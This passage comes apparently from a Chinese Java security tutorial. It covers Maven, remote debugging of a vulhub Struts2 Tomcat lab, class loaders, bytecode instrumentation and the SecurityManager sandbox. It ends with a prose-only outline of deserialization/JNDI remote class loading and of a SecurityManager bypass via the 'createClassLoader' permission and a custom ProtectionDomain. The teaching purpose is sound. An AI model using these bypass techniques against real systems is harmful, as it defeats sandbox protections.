将打包的文件发布到远程参考,提供其他人员进行下载依赖 ,一般是发布到公司的私服\n\n**mvn 快速构建java项目命令**\n\n```xml\nmvn archetype:generate -DgroupId=com.companyname.bank -DartifactId=consumerBanking -DarchetypeArtifactId=maven-archetype-quickstart -DinteractiveMode=false\n```\n\n**mvn 快速构建web项目**\n\n```xml\nmvn archetype:generate -DgroupId=com.companyname.automobile -DartifactId=trucks -DarchetypeArtifactId=maven-archetype-webapp  -DinteractiveMode=false\n```\n\nMaven内容很多，这边给大家介绍下概念，以及最基本用法，详细知识点大家可以移步到https://www.runoob.com/maven/maven-tutorial.html学习。\n\n## IDEA调试远程调试\n\n**配置tomcat调试模式**\n\ndockerfile配置样例，tomcat以调试模式打开\n\n```dockerfile\nFROM vulhub/tomcat:8.5\n\nMAINTAINER phithon <root@leavesongs.com>\n\nUSER root\nRUN set -ex \\\n    && rm -rf /usr/local/tomcat/webapps/* \\\n    && chmod a+x /usr/local/tomcat/bin/*.sh\nCOPY S2-001.war /usr/local/tomcat/webapps/ROOT.war\nENV JPDA_ADDRESS 5005\nENV JPDA_TRANSPORT dt_socket\nCMD [\"catalina.sh\", \"jpda\", \"run\"]\nEXPOSE 8080\nEXPOSE 5005\n```\n\ndocker-compose.yml配置样例\n\n```dockerfile\nversion: '2'\nservices:\n struts2:\n   build: .\n   ports:\n    - \"8080:8080\"\n    - \"5005:5005\"\n```\n\n然后docker-compose up -d就启动tomcat的调试模式\n\n**配置IDEA，连接远程服务器**\n\n点击Edit Configurations\n\n![](/images/a1/2.png)\n\n配置Remote\n\n![](/images/a1/3.png)\n\n点击debug，连接成功显示如下所示内容\n\n![](/images/a1/4.png)\n\n# JVM类加载器\n\n## 类加载器简介\n\n类加载器（class loader）用来加载 Java 类到 Java 虚拟机中。一般来说，Java 虚拟机使用 Java 类的方式如下：Java 源程序（.java 文件）在经过 Java 编译器编译之后就被转换成 Java 字节代码（.class 文件）。**类加载器负责读取 Java 字节代码，并转换成 java.lang.Class 类的一个实例**。每个这样的实例用来表示一个 Java 类。\n\n**基本上所有的类加载器都是 java.lang.ClassLoader 类的一个实例**。java.lang.ClassLoader 类的基本职责就是根据一个指定的类的名称，找到或者生成其对应的字节代码，然后从这些字节代码中定义出一个 Java 类，即 java.lang.Class 类的一个实例。\n\nJava 中的类加载器大致可以分成两类，一类是系统提供的，另外一类则是由 Java 应用开发人员编写的，开发人员可以通过继承 java.lang.ClassLoader 类的方式实现自定义类加载器，以满足一些特殊的需求。\n\n系统提供的类加载器主要有下面三个：\n\n- **引导类加载器(Bootstrap ClassLoader)**：负责将 $JAVA_HOME/lib 或者 -Xbootclasspath 参数指定路径下面的文件(按照文件名识别，如 rt.jar) 加载到虚拟机内存中。它用来加载 Java 的核心库，是用原生代码实现的，并不继承自 java.lang.ClassLoader，引导类加载器无法直接被 java 代码引用。\n- **扩展类加载器(Extension ClassLoader)**：负责加载 $JAVA_HOME/lib/ext 目录中的文件，或者 java.ext.dirs 系统变量所指定的路径的类库，它用来加载 Java 的扩展库。\n- **应用程序类加载器(Application ClassLoader)**：一般是系统的默认加载器，它根据 Java 应用的类路径（CLASSPATH）来加载 Java 类。一般 Java 应用的类都是由它来完成加载的，可以通过 ClassLoader.getSystemClassLoader() 来获取它。\n\n## 类加载过程 — 双亲委派模型\n\n（1） 类加载器结构\n\n除了引导类加载器之外，所有的类加载器都有一个父类加载器。应用程序类加载器的父类加载器是扩展类加载器，扩展类加载器的父类加载器是引导类加载器。一般来说，开发人员自定义的类加载器的父类加载器是应用程序类加载器。\n\n![](/images/a1/5.png)\n\n（2）双亲委派模型\n\n类加载器在尝试去查找某个类的字节代码并定义它时，会先代理给其父类加载器，由父类加载器先去尝试加载这个类，如果父类加载器没有，继续寻找父类加载器，依次类推，如果到引导类加载器都没找到才从自身查找。这个类加载过程就是双亲委派模型。\n\n首先要明白，**Java 虚拟机判定两个 Java 类是否相同，不仅要看类的全名是否相同，还要看加载此类的类加载器是否一样(可以通过 class.getClassLoader() 获得)**。只有两个类来源于同一个Class文件，并且被同一个类加载器加载，这两个类才相等。不同类加载器加载的类之间是不兼容的。\n\n双亲委派模型就是为了保证 Java 核心库的类型安全的。所有 Java 应用都至少需要引用 java.lang.Object 类，也就是说在运行的时候，java.lang.Object 这个类需要被加载到 Java 虚拟机中。如果这个加载过程由 Java 应用自己的类加载器来完成的话，很可能就存在多个版本的 java.lang.Object 类，而这些类之间是不兼容的。通过双亲委派模型，对于 Java 核心库的类加载工作由引导类加载器来统一完成，保证了 Java 应用所使用的都是同一个版本的 Java 核心库的类，是互相兼容的。\n\n类加载器在成功加载某个类之后，会把得到的 java.lang.Class 类的实例缓存起来。下次再请求加载该类的时候，类加载器会直接使用缓存的类的实例，而不会尝试再次加载。\n\n# Java字节码技术\n\n## ASM\n\n对于需要手动操纵字节码的需求，可以使用ASM，它可以直接生产 .class字节码文件，也可以在**类被加载入JVM之前**动态修改类行为。ASM的应用场景有AOP（Cglib就是基于ASM）、热部署、修改其他jar包中的类等。\n\n先看ASM对字节码操作的过程图\n\n![在这里插入图片描述](/images/a1/0.png)\n\n\n\n## JavaAssist\n\nASM虽然可以达到修改字节码的效果，但是代码实现上更偏底层，是一个个虚拟机指令的组合，不好理解、记忆，和Java语言的编程习惯有较大差距。\n\n利用Javassist实现字节码增强时，可以无须关注字节码刻板的结构，其优点就在于编程简单。直接使用java编码的形式，而不需要了解虚拟机指令，就能动态改变类的结构或者动态生成类。\n\n## Instrumentation\n\n上面JavaAssist有什么缺点？\n\n上面ASM和JavaAssist的Demo，都有一个共同点：**两者例子中的目标类都没有被提前加载到JVM中**，如果只能在类加载前对类中字节码进行修改，那将失去其存在意义，毕竟大部分运行的Java系统，都是在运行状态的线上系统。\n\nJava Instrumentation指的是可以用独立于应用程序之外的代理（agent）程序来监测和协助运行在JVM上的应用程序。这种监测和协助包括但不限于获取JVM运行时状态，替换和修改类定义等。简单一句话概括下：Java Instrumentation可以在JVM启动后，动态修改已加载或者未加载的类，包括类的属性、方法。要使用instrument的类修改功能，我们需要实现它提供的ClassFileTransformer接口，定义一个类文件转换器。\n**先看下其关键方法**\n\n```java\npublic interface Instrumentation {\n    //添加一个类文件转换器\n    void addTransformer(ClassFileTransformer transformer);\n    //重新加载一个类，加载时触发ClassFileTransformer接口\n    void retransformClasses(Class<?>... classes) throws UnmodifiableClassException;\n}\n```\n\n我们需要实现ClassFileTransformer接口，并在自定义的transform方法中，利用ASM或者JavaAssist等字节码操作框架对类的字节码进行修改，修改后返回字节码的byte[]数组\n\n自定义实现如下ClassFileTransformer，过滤掉类名不是AopDemoServiceWithoutInterface的类，同时使用JavaAssist对AopDemoServiceWithoutInterface进行增强\n\n```java\npublic class MyClassTransformer implements ClassFileTransformer {\n    @Override\n    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {\n        if (!className.equals(\"aop/demo/service/AopDemoServiceWithoutInterface\")) {\n            return null;\n        }\n        try {\n            System.out.println(\"MyClassTransformer，当前类名:\" + className);\n            ClassPool classPool = ClassPool.getDefault();\n            CtClass ctClass = classPool.get(\"aop.demo.service.AopDemoServiceWithoutInterface\");\n            CtMethod ctMethod = ctClass.getDeclaredMethod(\"sayHelloFinal\");\n            ctMethod.insertBefore(\"{ System.out.println(\\\"start\\\");}\");\n            ctMethod.insertAfter(\"{ System.out.println(\\\"end\\\"); }\");\n            return ctClass.toBytecode();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        return null;\n    }\n}\n```\n\n## JavaAgent\n\n光有Instrumentation接口还不够，如何将其注入到一个正在运行JVM的进程中去呢？我们还需要自定义一个Agent，借助Agent的能力将Instrumentation注入到运行的JVM中\n\nAgent是JVMTI的一种实现，Agent有两种启动方式：\n\n1. 一是随Java进程启动而启动，经常见到的java -agentlib就是这种方式；\n2. 二是运行时载入，通过attach API，将模块（jar包）动态地Attach到指定进程id的Java进程内。\n\n# SecurityManager沙箱分析\n\n## 简介\n\n安全管理器（SecurityManger）是为了保护JVM在运行有漏洞或恶意的代码不会破坏外部资源，这是api级别的，可自定义的安全策略管理器。\n\n安全管理器（SecurityManger）在java中的作用就是检查操作是否有权限执行，是java沙箱的基础组件。通过Java命令行启动的java应用程序，默认不启用沙箱。要启动沙箱，需要：\n\n```java\njava -Djava.security.manager <other args>\n```\n\n也可以指定策略文件：\n\n```java\njava -Djava.security.policy=<URL>\n```\n\n如果要求启动时只遵循一个策略文件，启动需要双等号，如下：\n\n```java\njava -Djava.security.policy==<URL>\n```\n\n还可以在代码中使用硬编码System.setSecurityManager()来启动安全管理器\n\n## 安全策略文件\n\n策略文件制定了具体的代码权限。可以使用jdk自带的policytool工具查看或编辑。\n\njava.policy有三个条目，每一条在java.policy文件中为一条grant记录，每一个grant记录含有一个codeBase（指定代码）及其permission（许可）：\n\n```\ngrant codeBase source { \n\tpermission permission_class_name ation;\n}\n```\n\n每一条grant记录遵循下面格式：\n\n* 以保留字“grant”开头，表示一条新的记录开始。\n* “permission”也是保留字，标记一个新的许可开始。\n* 每一个grant记录授予一个指定的代码（CodeBase）一套许可（Permissons）。\n* source指定目标类的位置\n* ation用于指定目标类拥有的权限\n\nsource三种通配符：\n\n1. directory/ 表示directory目录下所有.class文件，不包括.jar文件\n2. directory/* 表示directory目录下所有的.class及.jar文件\n3. directory/- 表示dierctory目录下的所有.class及.jar文件，包括子目录\n\n## 权限\n\n权限定义的格式包含三部分：权限类型、权限名和允许的操作。例：\n\n```\n// 权限类型\npermission java.security.AllPermission\n\n// 权限类型+权限名\npermission java.loang.RuntimePermission \"stopThread\";\n\n// 权限类型+权限名+允许的操作\npermission java.io.FilePermission \"/tmp/test\" \"read\"\n```\n\n所有权限列表\n\n|            | 类型                                | 权限名                                                   | 操作                   | 例子                                                         |      |\n| ---------- | ----------------------------------- | -------------------------------------------------------- | ---------------------- | ------------------------------------------------------------ | ---- |\n| 文件权限   | java.io.FilePermission              | 文件名（平台依赖）                                       | 读、写、删除、执行     | 允许所有文件的读写删除执行：permission java.io.FilePermission \"<< ALL FILES>>\", \"read,write,delete,execcute\"; |      |\n| 套接字权限 | java.net.SocketPermission           | 主机名:端口                                              | 接收、监听、连接、解析 | 允许实现所有套接字操作：permission java.net.SocketPermission \":1-\",\"accept,listen,connect,resolve\"; |      |\n| 属性权限   | java.util.PropertyPermission        | 需要访问的jvm属性名                                      | 读、写                 | 读标准java属性：permission java.util.PropertyPermission \"java.\",\"read\"; |      |\n| 运行时权限 | java.lang.RuntimePermission         | 多种权限名                                               | 无                     | 允许代码初始化打印任务：permission java.lang.RuntimePermission \"queuePrintJob\" |      |\n| AWT权限    | java.awt.AWTPermission              | 6种权限名                                                | 无                     | 允许代码充分使用test类：permission java.awt.AWTPermission \"createTest\";permission java.awt.AWTPermission \"readDisplayPixels\"; |      |\n| 网络权限   | java.net.NetPermission              | 3种权限名                                                | 无                     | 允许安装流处理器：permission java.net.NetPermission \"specifyStreamHandler\"; |      |\n| 安全权限   | java.security.SecurityPermission    | 多种权限名                                               | 无                     |                                                              |      |\n| 序列化权限 | java.io.SerializeablePermission     | 2种权限名                                                | 无                     |                                                              |      |\n| 反射权限   | java.lang.reflect.ReflectPermission | suppressAccessChecks（允许利用反射检查任意类的私有变量） |                        |                                                              |      |\n| 完全权限   | java.security.AllPermission         | 无（拥有执行任何操作的权限）                             |                        |                                                              |      |\n\n## SecurityManager的原理与影响\n\n一般API设计到安全管理器的原理：\n\n1. 请求java api\n2. java api使用安全管理器判断许可权限\n3. 通过则顺序执行，否则抛出Exception\n\n例如JDK源码中的FileInputStream类，如果开启沙箱，则安全管理器不是null，检查checkRead（name）。而checkRead方法则是依据访问控制策略的一个权限检查。\n\n![](/images/a1/6.png)\n\n###如何破坏反序列化漏洞\n\n对于java反序列对象漏洞利用来说，一般两种形式：\n\n1. 在classpath下寻找弱点jar包，通过gadget串联拼凑最终通过该反序列执行任意代码。 -- **这种场景实际利用困难，一方面适合的gadget不容易找，另一方面业界已经披露有问题的三方件，产品一般都已升级**\n2. 在classpath下寻找弱点jar包，结合**JDNI注入**，通过远程加载恶意类执行任意代码 -- **这种手法是目前更有效的一种方法**\n\n可以通过安全策略限制文件执行权限，导致rce失败。\n\n### 如何绕过SecurityManager\n\n如果policy中设置存在如下规则：\n\n```\npermission java.lang.RuntimePermission \"createClassLoader\";\n```\n\n则存在绕过可能性。\n\n原理：当我们拥有建立一个自己的ClassLoader的权限，我们完全可以在这个ClassLoader中建立自己的一个class，并赋予一个新的SecurityManager策略，这个策略也可以是null，及关闭整个java安全管理器。核心在ClassLoader存在一个方法叫defineClass，defineClass允许接受一个参数ProtectionDomain，我们能够自建一个ProtectionDomain将自己配置好的权限设置进去，define出来的class则拥有新的权限。\n\n\n\n**参考：**\n\n[https://www.cnblogs.com/coprince/p/8603492.html](https://www.cnblogs.com/coprince/p/8603492.html)\n\nhttps://segmentfault.com/a/1190000020248225?utm_source=tag-newest\n\nhttps://www.runoob.com/maven/maven-tutorial.html\n\nhttps://blog.csdn.net/belvine/article/details/89552524\n\n","tags":["JAVA","安全"],"categories":["JAVA安全教程"]}]